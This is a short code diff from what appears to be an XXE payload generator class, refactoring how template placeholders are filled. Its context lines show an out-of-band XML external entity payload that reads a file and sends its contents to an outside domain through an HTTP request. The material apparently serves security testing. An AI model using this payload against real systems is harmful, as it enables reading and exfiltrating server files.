@@ -39,9 +39,7 @@ class XxeTemplate(BaseTemplate):
 <!ENTITY % demo "<!ENTITY bbbb SYSTEM 'http://{{domain}}/{{key}}?message=%aaaa;'>">
 %demo;
         """
-        code = read_file_code.replace("{{domain}}", self.domain).replace("{{key}}", self.key).replace("{{path}}", item[
-            "config"]["path"])
-        return code
+        return self.replace_code(code=read_file_code)
 
     def generate(self, key, config):
         code = ''
